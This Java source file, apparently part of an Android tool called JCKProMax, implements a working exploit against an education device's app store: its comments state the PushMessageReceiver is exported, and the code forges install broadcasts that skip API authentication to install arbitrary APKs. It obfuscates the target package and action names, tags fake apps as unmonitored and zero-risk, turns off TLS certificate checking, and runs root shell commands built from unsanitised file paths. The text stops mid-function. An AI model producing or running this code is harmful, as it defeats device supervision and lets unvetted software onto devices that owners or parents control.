package com.jck.promax;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Random;

/**
 * 广播安装页面
 * 
 * 漏洞原理: 应用商店的 PushMessageReceiver 配置了 android:exported="true"，
 * 导致任何应用都可发送 com.zuoyebang.iot.push 广播触发安装。
 * 
 * 通过构造特定格式的广播数据，可以直接向应用商店发送安装请求，
 * 绕过API鉴权，实现本地APK直链安装。
 * 
 * 支持两种APK来源:
 * 1. HTTP/HTTPS URL直链 - 下载APK后计算真实MD5
 * 2. 本地APK文件 - 通过文件选择器选取，直接计算MD5并自动解析APK信息
 */
public class BroadcastInstallActivity extends Activity {

    private EditText apkUrlInput;
    private EditText appNameInput;
    private EditText pkgNameInput;
    private EditText iconUrlInput;
    private Button sendBroadcastBtn;
    private Button previewBtn;
    private Button pickFileBtn;
    private Button backBtn;
    private TextView logText;

    // 本地选中APK的缓存路径（如果使用了本地文件）
    private String localApkPath = null;

    // 文件选择器请求码
    private static final int REQUEST_PICK_APK = 2001;

    // 目标包名
    private static final String TARGET_PACKAGE = Obfuscator.dec2(
        new byte[]{(byte)0xc3,(byte)0x2c,(byte)0xcd,(byte)0x6d,(byte)0xda,(byte)0x36,(byte)0xcf,(byte)0x3a,(byte)0xc5,(byte)0x21,(byte)0xc1,(byte)0x2d,(byte)0xc7,(byte)0x6d,(byte)0xc9,(byte)0x2c,(byte)0xd4,(byte)0x6d,(byte)0xd0,(byte)0x22,(byte)0xc4,(byte)0x6d,(byte)0xc1,(byte)0x33,(byte)0xd0,(byte)0x30,(byte)0xd4,(byte)0x2c,(byte)0xd2,(byte)0x26},
        (byte)0xa0, (byte)0x43);
    // 广播Action
    private static final String BROADCAST_ACTION = Obfuscator.dec2(
        new byte[]{(byte)0xab,(byte)0xd8,(byte)0xa5,(byte)0x99,(byte)0xb2,(byte)0xc2,(byte)0xa7,(byte)0xce,(byte)0xad,(byte)0xd5,(byte)0xa9,(byte)0xd9,(byte)0xaf,(byte)0x99,(byte)0xa1,(byte)0xd8,(byte)0xbc,(byte)0x99,(byte)0xb8,(byte)0xc2,(byte)0xbb,(byte)0xdf},
        (byte)0xc8, (byte)0xb7);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_broadcast_install);

        initViews();
        setupListeners();
        appendLog("广播安装工具已启动");
        appendLog("目标: " + TARGET_PACKAGE);
        appendLog("广播Action: " + BROADCAST_ACTION);
        appendLog("支持URL直链下载 或 选择本地APK文件");
    }

    private void initViews() {
        backBtn = findViewById(R.id.backBtn);
        apkUrlInput = findViewById(R.id.apkUrlInput);
        appNameInput = findViewById(R.id.appNameInput);
        pkgNameInput = findViewById(R.id.pkgNameInput);
        iconUrlInput = findViewById(R.id.iconUrlInput);
        sendBroadcastBtn = findViewById(R.id.sendBroadcastBtn);
        previewBtn = findViewById(R.id.previewBtn);
        pickFileBtn = findViewById(R.id.pickFileBtn);
        logText = findViewById(R.id.logText);
    }

    private void setupListeners() {
        backBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { finish(); }
        });

        pickFileBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                openFilePicker();
            }
        });

        sendBroadcastBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                sendInstallBroadcast();
            }
        });

        previewBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                previewBroadcastData();
            }
        });
    }

    /**
     * 打开文件选择器，选择本地APK文件
     */
    private void openFilePicker() {
        try {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("application/vnd.android.package-archive");
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            startActivityForResult(Intent.createChooser(intent, "选择APK文件"), REQUEST_PICK_APK);
        } catch (Exception e) {
            appendLog("打开文件选择器失败: " + e.getMessage());
            // 如果指定MIME type没有文件，尝试用通配符
            try {
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("*/*");
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                startActivityForResult(Intent.createChooser(intent, "选择APK文件"), REQUEST_PICK_APK);
            } catch (Exception e2) {
                appendLog("文件选择器不可用: " + e2.getMessage());
                Toast.makeText(this, "文件选择器不可用", Toast.LENGTH_SHORT).show();
            }
        }
    }

    /**
     * 处理文件选择器返回结果
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_PICK_APK && resultCode == RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri == null) {
                appendLog("未获取到文件URI");
                Toast.makeText(this, "未获取到文件", Toast.LENGTH_SHORT).show();
                return;
            }
            appendLog("选中文件: " + uri.toString());
            copyLocalApkAndParse(uri);
        }
    }

    /**
     * 将ContentProvider URI指向的APK复制到缓存目录，并解析APK信息
     */
    /**
     * 将APK文件复制到应用商店可访问的公共目录
     * 优先使用root复制到 /sdcard/Download/，其次使用外部files目录
     */
    private String copyToPublicDir(File sourceFile) {
        // 1. 优先使用root复制到 /sdcard/Download/（世界可读）
        try {
            String publicDownload = Environment.getExternalStorageDirectory().getAbsolutePath()
                + "/Download/jck_" + System.currentTimeMillis() + ".apk";
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                "cp '" + sourceFile.getAbsolutePath() + "' '" + publicDownload
                + "' && chmod 644 '" + publicDownload + "'"});
            p.waitFor();
            if (p.exitValue() == 0) {
                appendLog("已复制到公共目录: " + publicDownload);
                return publicDownload;
            }
        } catch (Exception ignored) {
            // root不可用，继续尝试其他方法
        }

        // 2. 尝试使用外部files目录（Android 10+无需权限）
        try {
            File publicDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
            if (publicDir != null) {
                publicDir.mkdirs();
                File dest = new File(publicDir, "jck_" + System.currentTimeMillis() + ".apk");
                FileInputStream fis = new FileInputStream(sourceFile);
                FileOutputStream fos = new FileOutputStream(dest);
                byte[] buf = new byte[65536];
                int len;
                while ((len = fis.read(buf)) != -1) {
                    fos.write(buf, 0, len);
                }
                fis.close();
                fos.close();
                appendLog("已复制到外部files目录: " + dest.getAbsolutePath());
                return dest.getAbsolutePath();
            }
        } catch (Exception ignored) {
        }

        // 3. 备用：使用私有缓存目录（应用商店可能无法访问）
        appendLog("警告: 无法复制到公共目录，使用私有缓存路径");
        return sourceFile.getAbsolutePath();
    }

    private void copyLocalApkAndParse(final Uri uri) {
        new AsyncTask<Void, String, String[]>() {
            ProgressDialog progressDialog;

            @Override
            protected void onPreExecute() {
                progressDialog = new ProgressDialog(BroadcastInstallActivity.this);
                progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
                progressDialog.setMessage("正在复制APK文件...");
                progressDialog.setCancelable(false);
                progressDialog.show();
            }

            @Override
            protected String[] doInBackground(Void... voids) {
                try {
                    // 先复制到私有缓存计算MD5和解析信息
                    File cacheDir = getCacheDir();
                    File tempFile = new File(cacheDir, "local_picked.apk");

                    InputStream is = getContentResolver().openInputStream(uri);
                    if (is == null) {
                        return new String[]{"error", "无法打开文件流"};
                    }

                    FileOutputStream fos = new FileOutputStream(tempFile);
                    byte[] buffer = new byte[65536];
                    int bytesRead;
                    long totalCopied = 0;
                    while ((bytesRead = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                        totalCopied += bytesRead;
                    }
                    fos.close();
                    is.close();

                    publishProgress("copied:" + totalCopied);

                    // 计算MD5
                    publishProgress("md5");
                    String md5 = calculateFileMd5(tempFile);
                    long fileSize = tempFile.length();

                    // 解析APK信息
                    publishProgress("parse");
                    String[] apkInfo = parseApkInfo(tempFile.getAbsolutePath());

                    // 复制到公共目录（应用商店可读）
                    publishProgress("topublic");
                    String publicPath = copyToPublicDir(tempFile);

                    return new String[]{"success", publicPath, md5,
                        String.valueOf(fileSize),
                        apkInfo != null ? apkInfo[0] : "",  // appName
                        apkInfo != null ? apkInfo[1] : ""   // pkgName
                    };
                } catch (Exception e) {
                    return new String[]{"error", e.getMessage() != null ? e.getMessage() : "未知错误"};
                }
            }

            @Override
            protected void onProgressUpdate(String... values) {
                if (values == null || values.length == 0) return;
                String type = values[0];
                if (type != null && progressDialog != null) {
                    if (type.startsWith("copied:")) {
                        long size = Long.parseLong(type.substring(7));
                        progressDialog.setMessage("已复制 " + formatFileSize(size) + "，正在计算MD5...");
                    } else if ("md5".equals(type)) {
                        progressDialog.setMessage("正在计算MD5校验值...");
                    } else if ("parse".equals(type)) {
                        progressDialog.setMessage("正在解析APK信息...");
                    } else if ("topublic".equals(type)) {
                        progressDialog.setMessage("正在复制到公共目录...");
                    }
                }
            }

            @Override
            protected void onPostExecute(String[] result) {
                if (progressDialog != null && progressDialog.isShowing()) {
                    progressDialog.dismiss();
                }

                if ("error".equals(result[0])) {
                    appendLog("复制文件失败: " + result[1]);
                    Toast.makeText(BroadcastInstallActivity.this, "处理失败: " + result[1], Toast.LENGTH_LONG).show();
                    return;
                }

                String filePath = result[1];
                String md5 = result[2];
                String fileSize = result[3];
                String parsedAppName = result[4];
                String parsedPkgName = result[5];

                // 保存本地APK路径（已更新为公共路径）
                localApkPath = filePath;

                // 更新输入框显示本地路径
                apkUrlInput.setText(filePath);

                // 自动填入解析出的应用名称（如果用户没有手动输入）
                if (parsedAppName != null && !parsedAppName.isEmpty()) {
                    String currentAppName = appNameInput.getText().toString().trim();
                    if (currentAppName.isEmpty()) {
                        appNameInput.setText(parsedAppName);
                    }
                }

                // 自动填入解析出的包名（如果用户没有手动输入）
                if (parsedPkgName != null && !parsedPkgName.isEmpty()) {
                    String currentPkgName = pkgNameInput.getText().toString().trim();
                    if (currentPkgName.isEmpty()) {
                        pkgNameInput.setText(parsedPkgName);
                    }
                }

                appendLog("本地APK已就绪");
                appendLog("文件路径: " + filePath);
                appendLog("文件大小: " + formatFileSize(Long.parseLong(fileSize)));
                appendLog("MD5: " + md5);
                if (parsedAppName != null && !parsedAppName.isEmpty()) {
                    appendLog("解析应用名: " + parsedAppName);
                }
                if (parsedPkgName != null && !parsedPkgName.isEmpty()) {
                    appendLog("解析包名: " + parsedPkgName);
                }

                Toast.makeText(BroadcastInstallActivity.this,
                    "APK已加载，可直接发送广播", Toast.LENGTH_SHORT).show();
            }
        }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
    }

    /**
     * 解析APK信息（应用名称和包名）
     * 
     * @param apkPath APK文件的本地绝对路径
     * @return String[2]: [0]=应用标签名, [1]=包名；解析失败返回null
     */
    private String[] parseApkInfo(String apkPath) {
        try {
            PackageManager pm = getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(apkPath, 0);
            if (info != null) {
                // 获取应用标签 - 需要临时设置sourceDir才能加载资源
                ApplicationInfo appInfo = info.applicationInfo;
                appInfo.sourceDir = apkPath;
                appInfo.publicSourceDir = apkPath;
                CharSequence label = pm.getApplicationLabel(appInfo);
                String appName = (label != null) ? label.toString() : "";
                String pkgName = (info.packageName != null) ? info.packageName : "";
                return new String[]{appName, pkgName};
            }
        } catch (Exception e) {
            // 解析失败，返回null
            appendLog("APK解析异常: " + (e.getMessage() != null ? e.getMessage() : "未知错误"));
        }
        return null;
    }

    /**
     * 判断输入是否为HTTP/HTTPS URL
     */
    private boolean isHttpUrl(String input) {
        if (input == null) return false;
        String lower = input.toLowerCase(Locale.ROOT);
        return lower.startsWith("http://") || lower.startsWith("https://");
    }

    /**
     * 构造并发送安装广播
     * 
     * 根据输入自动判断来源:
     * - HTTP/HTTPS URL: 下载APK -> 计算真实MD5 -> 发送广播
     * - 本地路径: 直接使用本地文件计算MD5 -> 发送广播
     */
    private void sendInstallBroadcast() {
        final String apkUrl = apkUrlInput.getText().toString().trim();
        final String appName = appNameInput.getText().toString().trim();
        final String pkgName = pkgNameInput.getText().toString().trim();
        final String iconUrl = iconUrlInput.getText().toString().trim();

        // 验证输入
        if (apkUrl.isEmpty()) {
            Toast.makeText(this, "请输入APK直链或选择本地APK文件", Toast.LENGTH_SHORT).show();
            return;
        }

        final String finalAppName = appName.isEmpty() ? "未知应用" : appName;
        final String finalPkgName = pkgName.isEmpty() ? "com.unknown.app" : pkgName;
        final String finalIconUrl = iconUrl.isEmpty() ? Obfuscator.dec3(new byte[]{(byte)0x40, (byte)0xec, (byte)0xb9, (byte)0x58, (byte)0xeb, (byte)0xf7, (byte)0x07, (byte)0xb7, (byte)0xb9, (byte)0x4d, (byte)0xf6, (byte)0xae, (byte)0x4d, (byte)0xf6, (byte)0xb9, (byte)0x4b, (byte)0xfc, (byte)0xa3, (byte)0x49, (byte)0xb6, (byte)0xbd, (byte)0x5a, (byte)0xf7, (byte)0xa9, (byte)0x5d, (byte)0xfb, (byte)0xb9, (byte)0x41, (byte)0xf7, (byte)0xa3, (byte)0x06, (byte)0xf4, (byte)0xa4, (byte)0x46, (byte)0xf3, (byte)0xfe, (byte)0x06, (byte)0xfb, (byte)0xae, (byte)0x07, (byte)0xe8, (byte)0xbf, (byte)0x47, (byte)0xfe, (byte)0xa4, (byte)0x44, (byte)0xfd, (byte)0x92, (byte)0x41, (byte)0xf5, (byte)0xac, (byte)0x4f, (byte)0xfd, (byte)0xbe, (byte)0x07, (byte)0xa9, (byte)0xfa, (byte)0x1d, (byte)0xab, (byte)0xff, (byte)0x10, (byte)0xab, (byte)0xf8, (byte)0x1e, (byte)0xad, (byte)0xfa, (byte)0x1d, (byte)0xa8}, (byte)0x28, (byte)0x98, (byte)0xcd) : iconUrl;

        if (isHttpUrl(apkUrl)) {
            // === HTTP URL 模式：下载APK并计算MD5 ===
            appendLog("========== 开始优化安装流程 (URL模式) ==========");
            appendLog("APK URL: " + apkUrl);
            appendLog("应用名: " + finalAppName);
            appendLog("包名: " + finalPkgName);
            appendLog("步骤1: 下载APK并计算MD5...");

            new AsyncTask<Void, String, String[]>() {
                ProgressDialog progressDialog;

                @Override
                protected void onPreExecute() {
                    progressDialog = new ProgressDialog(BroadcastInstallActivity.this);
                    progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                    progressDialog.setMax(100);
                    progressDialog.setProgress(0);
                    progressDialog.setMessage("正在下载APK...");
                    progressDialog.setCancelable(false);
                    progressDialog.show();
                }

                @Override
                protected String[] doInBackground(Void... voids) {
                    try {
                        // 下载APK到缓存目录
                        File cacheDir = getCacheDir();
                        File apkFile = new File(cacheDir, "temp_install.apk");

                        publishProgress("connecting");
                        HttpHelper.trustAllCertificates();
                        URL url = new URL(apkUrl);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setConnectTimeout(15000);
                        conn.setReadTimeout(60000);

                        // 完整请求头 - 模拟浏览器下载，避免被限速
                        conn.setRequestProperty("User-Agent",
                            "Mozilla/5.0 (Linux; Android 12; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");
                        conn.setRequestProperty("Accept", "*/*");
                        conn.setRequestProperty("Accept-Encoding", "identity");
                        conn.setRequestProperty("Connection", "keep-alive");
                        conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
                        conn.setRequestProperty("Cache-Control", "no-cache");
                        // Referer 用于绕过部分CDN防盗链
                        String host = url.getHost();
                        if (host != null) {
                            conn.setRequestProperty("Referer", "https://" + host + "/");
                        }

                        int responseCode = conn.getResponseCode();
                        if (responseCode != 200) {
                            return new String[]{"error", "HTTP错误: " + responseCode};
                        }

                        long totalSize = conn.getContentLength();
                        publishProgress("size:" + totalSize);

                        InputStream is = conn.getInputStream();
                        FileOutputStream fos = new FileOutputStream(apkFile);

                        // 使用64KB大缓冲区提升下载速度
                        byte[] buffer = new byte[65536];
                        long downloaded = 0;
                        int bytesRead;
                        long startTime = System.currentTimeMillis();
                        long lastUpdateTime = startTime;
                        long lastDownloaded = 0;

                        while ((bytesRead = is.read(buffer)) != -1) {
                            fos.write(buffer, 0, bytesRead);
                            downloaded += bytesRead;

                            long now = System.currentTimeMillis();
                            // 每200ms更新一次进度，避免UI刷新过于频繁
                            if (now - lastUpdateTime >= 200) {
                                int progress = totalSize > 0 ? (int) (downloaded * 100 / totalSize) : -1;

                                // 计算下载速度
                                long timeDiff = now - lastUpdateTime;
                                long bytesDiff = downloaded - lastDownloaded;
                                long speed = timeDiff > 0 ? (bytesDiff * 1000 / timeDiff) : 0;

                                // 计算剩余时间
                                long totalTime = now - startTime;
                                long avgSpeed = totalTime > 0 ? (downloaded * 1000 / totalTime) : 0;
                                long remaining = avgSpeed > 0 ? (totalSize - downloaded) / avgSpeed : -1;

                                publishProgress("progress:" + progress,
                                    "size:" + downloaded + "/" + totalSize,
                                    "speed:" + speed,
                                    "remaining:" + remaining);

                                lastUpdateTime = now;
                                lastDownloaded = downloaded;
                            }
                        }
                        fos.close();
                        is.close();
                        conn.disconnect();

                        long totalTime = System.currentTimeMillis() - startTime;
                        long avgSpeed = totalTime > 0 ? (downloaded * 1000 / totalTime) : 0;
                        publishProgress("done:" + downloaded + ":" + avgSpeed + ":" + totalTime);

                        // 计算MD5
                        publishProgress("md5start");
                        String md5 = calculateFileMd5(apkFile);
                        long fileSize = apkFile.length();

                        return new String[]{"success", md5, String.valueOf(fileSize), apkFile.getAbsolutePath()};

                    } catch (Exception e) {
                        return new String[]{"error", e.getMessage()};
                    }
                }

                @Override
                protected void onProgressUpdate(String... values) {
                    String type = values[0];
                    if (type == null) return;

                    if (type.startsWith("progress:")) {
                        int progress = Integer.parseInt(type.substring(9));
                        if (progress >= 0 && progressDialog != null) {
                            progressDialog.setProgress(progress);
                        }

                        if (values.length >= 4) {
                            long downloaded = 0, totalSize = 0, speed = 0, remaining = -1;
                            if (values[1].startsWith("size:")) {
                                String[] parts = values[1].substring(5).split("/");
                                downloaded = Long.parseLong(parts[0]);
                                if (parts.length > 1) totalSize = Long.parseLong(parts[1]);
                            }
                            if (values[2].startsWith("speed:")) {
                                speed = Long.parseLong(values[2].substring(6));
                            }
                            if (values[3].startsWith("remaining:")) {
                                remaining = Long.parseLong(values[3].substring(10));
                            }

                            StringBuilder msg = new StringBuilder();
                            msg.append("下载中: ").append(formatFileSize(downloaded));
                            if (totalSize > 0) msg.append(" / ").append(formatFileSize(totalSize));
                            msg.append("\n速度: ").append(formatFileSize(speed)).append("/s");
                            if (remaining >= 0) {
                                if (remaining < 60) msg.append(" | 剩余: ").append(remaining).append("秒");
                                else msg.append(" | 剩余: ").append(remaining / 60).append("分").append(remaining % 60).append("秒");
                            }

                            if (progressDialog != null) {
                                progressDialog.setMessage(msg.toString());
                            }
                            appendLog("下载 " + (progress >= 0 ? progress + "%" : "?") +
                                " " + formatFileSize(downloaded) +
                                (totalSize > 0 ? "/" + formatFileSize(totalSize) : "") +
                                " " + formatFileSize(speed) + "/s");
                        }
                    } else if (type.startsWith("size:")) {
                        long totalSize = Long.parseLong(type.substring(5));
                        if (totalSize > 0) {
                            appendLog("文件大小: " + formatFileSize(totalSize));
                        } else {
                            appendLog("文件大小未知，开始下载...");
                        }
                    } else if (type.startsWith("done:")) {
                        String[] parts = type.substring(5).split(":");
                        if (parts.length >= 3) {
                            appendLog("下载完成: " + formatFileSize(Long.parseLong(parts[0])) +
                                " 平均速度: " + formatFileSize(Long.parseLong(parts[1])) + "/s" +
                                " 耗时: " + (Long.parseLong(parts[2]) / 1000) + "秒");
                        }
                        if (progressDialog != null) {
                            progressDialog.setProgress(100);
                            progressDialog.setMessage("正在计算MD5...");
                        }
                    } else if ("md5start".equals(type)) {
                        if (progressDialog != null) {
                            progressDialog.setMessage("正在计算MD5校验值...");
                        }
                    } else if ("connecting".equals(type)) {
                        appendLog("正在连接服务器...");
                    } else {
                        appendLog(type);
                    }
                }

                @Override
                protected void onPostExecute(String[] result) {
                    if (progressDialog != null && progressDialog.isShowing()) {
                        progressDialog.dismiss();
                    }

                    if ("error".equals(result[0])) {
                        appendLog("下载失败: " + result[1]);
                        Toast.makeText(BroadcastInstallActivity.this, "下载失败: " + result[1], Toast.LENGTH_LONG).show();
                        return;
                    }

                    String md5 = result[1];
                    String fileSize = result[2];
                    String localPath = result[3];

                    appendLog("APK下载完成");
                    appendLog("文件大小: " + formatFileSize(Long.parseLong(fileSize)));
                    appendLog("MD5: " + md5);
                    appendLog("本地路径: " + localPath);
                    appendLog("步骤2: 发送广播安装...");

                    // 发送广播（使用真实MD5）
                    sendBroadcastWithMd5(apkUrl, finalAppName, finalPkgName, finalIconUrl, md5, Long.parseLong(fileSize));
                }
            }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

        } else {
            // === 本地文件模式：直接使用本地文件计算MD5 ===
            appendLog("========== 开始优化安装流程 (本地文件模式) ==========");

            // 确定本地文件路径
            final String localPath;
            if (localApkPath != null && apkUrl.equals(localApkPath)) {
                // 使用之前通过文件选择器选中的缓存文件
                localPath = localApkPath;
            } else {
                // 用户手动输入的路径
                localPath = apkUrl;
            }

            final File apkFile = new File(localPath);
            if (!apkFile.exists()) {
                appendLog("文件不存在: " + localPath);
                Toast.makeText(this, "APK文件不存在: " + localPath, Toast.LENGTH_LONG).show();
                return;
            }

            appendLog("APK路径: " + localPath);
            appendLog("应用名: " + finalAppName);
            appendLog("包名: " + finalPkgName);
            appendLog("步骤1: 计算本地APK的MD5...");

            new AsyncTask<Void, String, String[]>() {
                ProgressDialog progressDialog;

                @Override
                protected void onPreExecute() {
                    progressDialog = new ProgressDialog(BroadcastInstallActivity.this);
                    progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
                    progressDialog.setMessage("正在计算MD5校验值...");
                    progressDialog.setCancelable(false);
                    progressDialog.show();
                }

                @Override
                protected String[] doInBackground(Void... voids) {
                    try {
                        publishProgress("md5start");
                        String md5 = calculateFileMd5(apkFile);
                        long fileSize = apkFile.length();

                        // 尝试解析APK信息（如果名称或包名为空）
                        String[] apkInfo = parseApkInfo(apkFile.getAbsolutePath());

                        return new String[]{"success", md5, String.valueOf(fileSize),
                            apkInfo != null ? apkInfo[0] : "",
                            apkInfo != null ? apkInfo[1] : ""
                        };
                    } catch (Exception e) {
                        return new String[]{"error", e.getMessage() != null ? e.getMessage() : "计算失败"};
                    }
                }

                @Override
                protected void onProgressUpdate(String... values) {
                    if (progressDialog != null) {
                        progressDialog.setMessage("正在计算MD5校验值...");
                    }
                }

                @Override
                protected void onPostExecute(String[] result) {
                    if (progressDialog != null && progressDialog.isShowing()) {
                        progressDialog.dismiss();
                    }

                    if ("error".equals(result[0])) {
                        appendLog("计算失败: " + result[1]);
                        Toast.makeText(BroadcastInstallActivity.this, "计算失败: " + result[1], Toast.LENGTH_LONG).show();
                        return;
                    }

                    String md5 = result[1];
                    String fileSize = result[2];
                    String parsedAppName = result[3];
                    String parsedPkgName = result[4];

                    appendLog("APK信息:");
                    appendLog("文件大小: " + formatFileSize(Long.parseLong(fileSize)));
                    appendLog("MD5: " + md5);

                    // 如果解析出了信息且用户没有手动填写，自动更新
                    if (parsedAppName != null && !parsedAppName.isEmpty()) {
                        String currentAppName = appNameInput.getText().toString().trim();
                        if (currentAppName.isEmpty() || "未知应用".equals(currentAppName)) {
                            appNameInput.setText(parsedAppName);
                            appendLog("解析应用名: " + parsedAppName);
                        }
                    }
                    if (parsedPkgName != null && !parsedPkgName.isEmpty()) {
                        String currentPkgName = pkgNameInput.getText().toString().trim();
                        if (currentPkgName.isEmpty() || "com.unknown.app".equals(currentPkgName)) {
                            pkgNameInput.setText(parsedPkgName);
                            appendLog("解析包名: " + parsedPkgName);
                        }
                    }

                    appendLog("步骤2: 发送广播安装...");

                    // 使用最新的名称和包名
                    String useAppName = appNameInput.getText().toString().trim();
                    if (useAppName.isEmpty()) useAppName = finalAppName;
                    String usePkgName = pkgNameInput.getText().toString().trim();
                    if (usePkgName.isEmpty()) usePkgName = finalPkgName;

                    // 发送广播（使用真实MD5，apkUrl使用本地路径）
                    sendBroadcastWithMd5(localPath, useAppName, usePkgName, finalIconUrl, md5, Long.parseLong(fileSize));
                }
            }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
        }
    }

    /**
     * 通过 root shell 直接安装 APK（绕过应用商店广播）
     * 更可靠，不会导致应用商店无响应
     */
    private boolean installViaRootShell(String apkPath) {
        try {
            appendLog("[root] 尝试通过 root shell 直接安装...");
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "pm install -r '" + apkPath + "' 2>/dev/null"});
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                output.append(line);
            }
            p.waitFor();
            String result = output.toString().trim();
            if (result.contains("Success") || p.exitValue() == 0) {
                appendLog("[root] 安装成功！");
                return true;
            } else {
                appendLog("[root] 安装失败: " + result);
                return false;
            }
        } catch (Exception e) {
            appendLog("[root] 安装异常: " + e.getMessage());
            return false;
        }
    }

    /**
     * 使用真实MD5发送安装广播
     */
    private void sendBroadcastWithMd5(String apkUrl, String appName, String pkgName, String iconUrl, String md5, long fileSize) {
        try {
            // 检查是否为本地文件路径（不是http URL），优先尝试 root 直接安装
            if (apkUrl != null && !apkUrl.startsWith("http://") && !apkUrl.startsWith("https://")) {
                appendLog("[*] 检测到本地文件，优先尝试 root 直接安装...");
                if (installViaRootShell(apkUrl)) {
                    appendLog("[+] 安装完成！");
                    Toast.makeText(this, "安装成功", Toast.LENGTH_LONG).show();
                    return;
                }
                appendLog("[*] root 安装不可用，回退到广播方式...");
            }

            // 生成随机msg_id (18位数字)
            Random random = new Random();
            StringBuilder sb = new StringBuilder();
            sb.append(random.nextInt(9) + 1);
            for (int i = 0; i < 17; i++) {
                sb.append(random.nextInt(10));
            }
            String msgId = sb.toString();

            // 生成随机负数ID
            int randomId = -(random.nextInt(3000) + 1);

            // 构造广播数据（使用真实MD5和文件大小）
            JSONObject data = new JSONObject();
            data.put("advertisement", 0);
            data.put("advertisementLabel", "无");
            data.put("age", 0);
            data.put("ageLabel", "");
            data.put("apkMd5", md5);  // 使用真实MD5
            data.put("apkName", pkgName);
            data.put("apkSize", fileSize);  // 使用真实文件大小
            data.put("apkSizeStr", formatFileSize(fileSize));
            data.put("apkUrl", apkUrl);
            data.put("apkVersion", "1.0");
            data.put("appIdThird", Math.abs(randomId));
            data.put("browseWeb", 0);
            data.put("browseWebLabel", "无");
            data.put("changeLog", "JCKProMax Broadcast Install");
            data.put("containPayContent", 0);
            data.put("developer", "Unknown");
            data.put("enName", "");
            data.put("entertainment", 0);
            data.put("entertainmentLabel", "无");
            data.put("extraThird", android.util.Base64.encodeToString("JCKProMax".getBytes(), android.util.Base64.NO_WRAP));
            data.put("from", 1);
            data.put("icon", iconUrl);
            data.put("icpNumber", "");
            data.put("id", randomId);
            data.put("isCtlWhite", 0);
            data.put("isGreenApp", 1);
            data.put("isMonitored", false);
            data.put("isSensitive", 0);
            data.put("name", appName);
            data.put("onShelf", 1);
            data.put("payContentLabel", "");
            data.put("permissions", JSONObject.NULL);
            data.put("previewPics", JSONObject.NULL);
            data.put("privacyLink", "");
            data.put("remark", "JCKProMax Broadcast Install");
            data.put("remoteInstallMsg", "安装 " + appName + " 中...");
            data.put("risk", 0);
            data.put("statusInPad", 0);
            data.put("summary", appName);
            data.put("supervise", 1);
            data.put("tags", JSONObject.NULL);
            data.put("type", 1);
            data.put("uploadTime", System.currentTimeMillis() / 1000);
            data.put("versionCodeThird", 1);

            // 构造IPC请求
            JSONObject ipcRequest = new JSONObject();
            ipcRequest.put("pkg_name", TARGET_PACKAGE);
            ipcRequest.put("msg_id", msgId);
            ipcRequest.put("sub_type", 3);
            ipcRequest.put("type", 2);
            ipcRequest.put("data", data);

            appendLog("MSG_ID: " + msgId);
            appendLog("随机ID: " + randomId);
            appendLog("广播数据构造完成（MD5已校验）");

            // 发送广播
            Intent intent = new Intent(BROADCAST_ACTION);
            intent.setPackage(TARGET_PACKAGE);
            intent.putExtra("response", ipcRequest.toString());
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            sendBroadcast(intent);

            appendLog("广播已发送!");
            appendLog("应用商店将使用本地APK直接安装（无需重新下载）");
            Toast.makeText(this, "广播已发送，请查看桌面", Toast.LENGTH_LONG).show();

        } catch (Exception e) {
            appendLog("发送失败: " + e.getMessage());
            Toast.makeText(this, "发送失败: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    /**
     * 计算文件MD5
     */
    private String calculateFileMd5(File file) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            InputStream is = new java.io.FileInputStream(file);
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                md.update(buffer, 0, bytesRead);
            }
            is.close();

            byte[] digest = md.digest();
            StringBuilder hex = new StringBuilder();
            for (byte b : digest) {
                hex.append(String.format("%02x", b & 0xff));
            }
            return hex.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * 格式化文件大小
     */
    private String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + "B";
        if (bytes < 1024 * 1024) return String.format("%.1fKB", bytes / 1024.0);
